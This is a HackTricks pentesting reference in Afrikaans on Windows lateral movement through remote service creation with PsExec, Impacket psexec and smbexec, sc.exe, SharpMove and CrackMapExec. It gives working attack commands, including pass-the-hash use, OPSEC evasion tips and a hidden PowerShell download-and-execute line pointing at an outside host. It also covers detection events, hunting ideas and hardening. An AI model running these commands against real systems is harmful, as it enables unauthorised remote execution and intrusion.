# PsExec/Winexec/ScExec/SMBExec

{{#include ../../banners/hacktricks-training.md}}

## Hoe werk hulle

Hierdie tegnieke misbruik die Windows Service Control Manager (SCM) op afstand oor SMB/RPC om opdragte op 'n teikenhost uit te voer. Die algemene vloei is:

1. Verifieer by die teiken en toegang tot die ADMIN$ deel oor SMB (TCP/445).
2. Kopieer 'n uitvoerbare lêer of spesifiseer 'n LOLBAS-opdraglyn wat die diens sal uitvoer.
3. Skep 'n diens op afstand via SCM (MS-SCMR oor \PIPE\svcctl) wat na daardie opdrag of binêre wys.
4. Begin die diens om die payload uit te voer en opsioneel stdin/stdout via 'n benoemde pyplyn vas te vang.
5. Stop die diens en maak skoon (verwyder die diens en enige gelaat binêre).

Vereistes/voorvereistes:
- Plaaslike Administrateur op die teiken (SeCreateServicePrivilege) of eksplisiete diens skeppingsregte op die teiken.
- SMB (445) bereikbaar en ADMIN$ deel beskikbaar; Afstandsdiensbestuur toegelaat deur die gasvuurmuur.
- UAC Afstandsbeperkings: met plaaslike rekeninge kan tokenfiltrering admin oor die netwerk blokkeer tensy die ingeboude Administrator of LocalAccountTokenFilterPolicy=1 gebruik word.
- Kerberos teen NTLM: die gebruik van 'n hostname/FQDN stel Kerberos in staat; verbinding deur IP val dikwels terug na NTLM (en kan geblokkeer word in geharde omgewings).

### Handmatige ScExec/WinExec via sc.exe

Die volgende toon 'n minimale diens-skepping benadering. Die diensbeeld kan 'n gelaat EXE of 'n LOLBAS soos cmd.exe of powershell.exe wees.
```cmd
:: Execute a one-liner without dropping a binary
sc.exe \\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc

:: Drop a payload to ADMIN$ and execute it (example path)
copy payload.exe \\TARGET\ADMIN$\Temp\payload.exe
sc.exe \\TARGET create HTSvc binPath= "C:\\Windows\\Temp\\payload.exe" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc
```
Notas:
- Verwacht 'n tydsduur fout wanneer 'n nie-diens EXE begin; uitvoering gebeur steeds.
- Om meer OPSEC-vriendelik te bly, verkies fileless opdragte (cmd /c, powershell -enc) of verwyder gelaaide artefakte.

Vind meer gedetailleerde stappe in: https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/

## Gereedskap en voorbeelde

### Sysinternals PsExec.exe

- Klassieke administratiewe hulpmiddel wat SMB gebruik om PSEXESVC.exe in ADMIN$ te plaas, installeer 'n tydelike diens (standaardnaam PSEXESVC), en proxy I/O oor benoemde pype.
- Voorbeeld gebruike:
```cmd
:: Interactive SYSTEM shell on remote host
PsExec64.exe -accepteula \\HOST -s -i cmd.exe

:: Run a command as a specific domain user
PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami /all

:: Customize the service name for OPSEC (-r)
PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
```
- U kan direk vanaf Sysinternals Live via WebDAV begin:
```cmd
\\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
```
OPSEC
- Laat diensinstallasie/ontinstallasie gebeurtenisse agter (diensnaam dikwels PSEXESVC tensy -r gebruik word) en skep C:\Windows\PSEXESVC.exe tydens uitvoering.

### Impacket psexec.py (PsExec-agtig)

- Gebruik 'n ingebedde RemCom-agtige diens. Laat 'n tydelike diens-binary val (gewoonlik gerandomiseerde naam) via ADMIN$, skep 'n diens (standaard dikwels RemComSvc), en proxy I/O oor 'n benoemde pyp.
```bash
# Password auth
psexec.py DOMAIN/user:Password@HOST cmd.exe

# Pass-the-Hash
psexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST cmd.exe

# Kerberos (use tickets in KRB5CCNAME)
psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe

# Change service name and output encoding
psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
```
Artifacts
- Tydelike EXE in C:\Windows\ (eweklike 8 karakters). Diensnaam is standaard RemComSvc tensy oorgeskryf word.

### Impacket smbexec.py (SMBExec)

- Skep 'n tydelike diens wat cmd.exe laat ontstaan en gebruik 'n benoemde pyp vir I/O. Vermy oor die algemeen om 'n volle EXE-lading te laat val; opdraguitvoering is semi-interaktief.
```bash
smbexec.py DOMAIN/user:Password@HOST
smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
```
### SharpLateral en SharpMove

- [SharpLateral](https://github.com/mertdas/SharpLateral) (C#) implementeer verskeie laterale bewegingsmetodes, insluitend diens-gebaseerde exec.
```cmd
SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
```
- [SharpMove](https://github.com/0xthirteen/SharpMove) sluit dienswysiging/creasie in om 'n opdrag op afstand uit te voer.
```cmd
SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
```
- Jy kan ook CrackMapExec gebruik om uit te voer via verskillende agtergronde (psexec/smbexec/wmiexec):
```bash
cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
```
## OPSEC, opsporing en artefakte

Tipiese gasheer/netwerk artefakte wanneer PsExec-agtige tegnieke gebruik word:
- Sekuriteit 4624 (Aanmeldtipe 3) en 4672 (Spesiale Privileges) op teiken vir die admin rekening wat gebruik is.
- Sekuriteit 5140/5145 Lêer Deel en Lêer Deel Gedetailleerde gebeurtenisse wat ADMIN$ toegang en skep/skryf van diens binêre (bv. PSEXESVC.exe of ewekansige 8-karakter .exe) toon.
- Sekuriteit 7045 Diens Install op teiken: diens name soos PSEXESVC, RemComSvc, of pasgemaak (-r / -service-name).
- Sysmon 1 (Proses Skep) vir services.exe of die diens beeld, 3 (Netwerk Verbinding), 11 (Lêer Skep) in C:\Windows\, 17/18 (Pyp Gemaak/Verbonden) vir pype soos \\.\pipe\psexesvc, \\.\pipe\remcom_*, of ewekansige ekwivalente.
- Registrasie artefak vir Sysinternals EULA: HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1 op die operateur gasheer (indien nie onderdruk nie).

Jag idees
- Waak op diens installs waar die ImagePath cmd.exe /c, powershell.exe, of TEMP plekke insluit.
- Soek na proses skep waar ParentImage C:\Windows\PSEXESVC.exe is of kinders van services.exe wat as LOCAL SYSTEM shell uitvoer.
- Merk naam pype wat eindig op -stdin/-stdout/-stderr of bekende PsExec kloon pyp name.

## Probleemoplossing algemene mislukkings
- Toegang is geweier (5) wanneer dienste geskep word: nie werklik plaaslike admin nie, UAC afstand beperkings vir plaaslike rekeninge, of EDR tampering beskerming op die diens binêre pad.
- Die netwerk pad is nie gevind nie (53) of kon nie met ADMIN$ verbind nie: firewall blokkeer SMB/RPC of admin deel is gedeaktiveer.
- Kerberos misluk maar NTLM is geblokkeer: verbind met hostname/FQDN (nie IP nie), verseker behoorlike SPNs, of verskaf -k/-no-pass met kaartjies wanneer Impacket gebruik word.
- Diens begin neem te lank maar payload het gedra: verwag as dit nie 'n werklike diens binêre is nie; vang uitvoer in 'n lêer of gebruik smbexec vir lewendige I/O.

## Versterking notas
- Windows 11 24H2 en Windows Server 2025 vereis SMB ondertekening standaard vir uitgaande (en Windows 11 inkomende) verbindings. Dit breek nie wettige PsExec gebruik met geldige kredensiaal nie, maar voorkom ongetekende SMB relay misbruik en kan toestelle beïnvloed wat nie ondertekening ondersteun nie.
- Nuwe SMB kliënt NTLM blokkering (Windows 11 24H2/Server 2025) kan NTLM terugval voorkom wanneer verbind met IP of na nie-Kerberos bedieners. In versterkte omgewings sal dit NTLM-gebaseerde PsExec/SMBExec breek; gebruik Kerberos (hostname/FQDN) of stel uitsonderings in indien wettig nodig.
- Beginsels van minste voorreg: minimaliseer plaaslike admin lidmaatskap, verkies Just-in-Time/Just-Enough Admin, handhaaf LAPS, en monitor/waak op 7045 diens installs.

## Sien ook

- WMI-gebaseerde afstand exec (dikwels meer fileless):

{{#ref}}
./wmiexec.md
{{#endref}}

- WinRM-gebaseerde afstand exec:

{{#ref}}
./winrm.md
{{#endref}}



## Verwysings

- PsExec - Sysinternals | Microsoft Learn: https://learn.microsoft.com/sysinternals/downloads/psexec
- SMB sekuriteit versterking in Windows Server 2025 & Windows 11 (ondertekening standaard, NTLM blokkering): https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591

{{#include ../../banners/hacktricks-training.md}}
